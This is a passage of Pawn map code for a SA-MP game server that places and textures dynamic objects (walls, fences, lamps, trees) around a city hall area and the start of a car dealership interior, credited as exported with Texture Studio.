	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1756.272,-1855.567,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1756.267,-1852.837,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1756.263,-1850.106,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1760.001,-1855.571,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1759.997,-1852.831,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1759.993,-1850.091,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1763.711,-1855.554,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1763.707,-1852.824,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1763.705,-1850.086,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1767.422,-1855.558,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1767.417,-1852.827,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1767.412,-1850.107,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1771.152,-1855.561,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1771.148,-1852.821,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1771.143,-1850.081,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1774.882,-1855.554,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1774.877,-1852.814,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1774.873,-1850.073,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1778.611,-1855.526,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1778.606,-1852.786,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1778.602,-1850.056,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1782.331,-1855.520,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1782.327,-1852.780,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1782.322,-1850.040,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1786.051,-1855.524,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1786.046,-1852.793,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1786.041,-1850.063,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1789.761,-1855.516,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1789.756,-1852.776,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1789.751,-1850.056,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1793.481,-1855.509,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1793.476,-1852.779,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1793.471,-1850.070,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1797.200,-1855.493,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1797.206,-1852.763,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1797.200,-1850.024,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1800.931,-1855.496,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1800.926,-1852.766,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1800.921,-1850.026,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1804.660,-1855.479,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1804.656,-1852.749,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1804.651,-1850.009,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1808.391,-1855.473,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1808.386,-1852.733,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 8423, "pirateship01", "tislandwall05_128", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1808.381,-1849.992,12.464,-89.999,0.399,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 16640, "a51", "metpat64", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1811.666,-1858.070,12.464,-89.999,89.999,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 16640, "a51", "ws_carparkwall2", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1811.633,-1854.350,12.464,-89.999,89.999,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 16640, "a51", "ws_carparkwall2", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1811.601,-1850.630,12.464,-89.999,89.999,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 16640, "a51", "ws_carparkwall2", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(2395,1811.568,-1846.900,12.464,-89.999,89.999,0.499,0,0,-1,1000.000,1000.000);
	SetDynamicObjectMaterial(tmpobjid, 0, 16640, "a51", "ws_carparkwall2", 0);
	SetDynamicObjectMaterial(tmpobjid, 1, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	SetDynamicObjectMaterial(tmpobjid, 11, 7094, "vgnretail5", "VgsN_wedtack1b", 0);
	tmpobjid = CreateDynamicObject(970,1810.396,-1871.353,13.105,-0.100,0.100,-90.200,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(970,1810.411,-1866.973,13.112,-0.100,0.100,-90.200,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(970,1788.912,-1866.979,13.150,-0.100,0.100,-90.200,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(970,1799.872,-1866.977,13.131,-0.100,0.100,-90.200,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(1256,1792.132,-1845.942,13.233,0.000,0.000,91.499,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(1223,1803.142,-1849.679,12.509,0.000,0.000,-88.600,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(1256,1795.838,-1845.730,13.243,0.000,0.000,-87.400,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(1223,1790.478,-1849.678,12.509,0.000,0.000,-88.600,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(970,1788.896,-1871.150,13.142,-0.100,0.100,-90.200,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(1223,1778.834,-1849.642,12.509,0.000,0.000,-88.600,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(1223,1766.317,-1849.548,12.509,0.000,0.000,-88.600,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(1223,1753.577,-1849.689,12.509,0.000,0.000,-88.600,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(869,1716.336,-1847.784,13.060,0.000,0.000,0.000,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(869,1717.186,-1850.774,13.060,0.000,0.000,0.000,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(869,1717.186,-1854.184,13.060,0.000,0.000,0.000,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(869,1718.556,-1856.454,13.060,0.000,0.000,0.000,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(869,1718.556,-1857.053,13.060,0.000,0.000,0.000,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(869,1713.536,-1856.773,13.060,0.000,0.000,0.000,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(705,1754.430,-1839.958,12.642,0.000,0.000,0.000,0,0,-1,1000.000,1000.000);
	tmpobjid = CreateDynamicObject(705,1774.839,-1844.014,12.642,0.000,0.000,128.599,0,0,-1,1000.000,1000.000);
	CreateDynamicObject(970, 1831.61292, -1836.70667, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1831.63159, -1838.72046, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1831.65784, -1846.53931, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1831.66284, -1848.57727, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1831.67993, -1852.71399, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1831.65039, -1856.84180, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1826.94763, -1857.87158, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1826.95215, -1853.78076, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1826.97424, -1849.65991, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1826.95337, -1846.56323, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1826.92847, -1837.24768, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1826.93616, -1833.14795, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1848.41211, -1864.67896, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1845.92981, -1868.25659, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1845.91602, -1872.06421, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1843.88599, -1874.11816, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1839.74304, -1874.12122, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1835.62329, -1874.11914, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1833.62329, -1874.10803, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1831.64502, -1877.45813, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19121, 1831.46216, -1874.13403, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1846.05237, -1874.24683, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1846.00049, -1865.98218, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1848.42236, -1862.51672, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1831.68567, -1859.17456, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1826.96985, -1860.03247, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1831.73853, -1844.34973, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1831.68909, -1840.92419, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1831.70789, -1834.43848, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1826.99731, -1830.94080, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1826.97949, -1840.80444, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19121, 1826.98169, -1844.42090, 13.10000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1826.91992, -1838.65283, 13.10000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1340, 1813.43188, -1844.26807, 13.59290,   0.00000, 0.00000, -40.00000);
	CreateDynamicObject(1209, 1810.68848, -1877.10693, 12.57730,   0.00000, 0.00000, 90.00000);
//----------------------------------------------------------[Yani CityHall]
//----------------------------------------------------------[New CarDealerShop]*/
//Map Exported with Texture Studio By: [uL]Pottus////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//Objects////////////////////////////////////////////////////////////////////////////////////////////////////////
new tmpobjid;
tmpobjid = CreateDynamicObject(18981,813.633,-973.890,1088.589,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 6863, "vgsnbuild07", "vegasbank3_256", 0);
tmpobjid = CreateDynamicObject(18981,838.619,-973.892,1088.589,0.000,90.000,0.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 6863, "vgsnbuild07", "vegasbank3_256", 0);
tmpobjid = CreateDynamicObject(18766,846.131,-973.758,1088.602,90.000,0.000,180.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14714, "vghss1int2", "HS1_2Floor1", 0);
tmpobjid = CreateDynamicObject(18766,836.160,-973.758,1088.602,90.000,0.000,180.000,-1,-1,-1,300.000,300.000);
SetDynamicObjectMaterial(tmpobjid, 0, 14714, "vghss1int2", "HS1_2Floor1", 0);
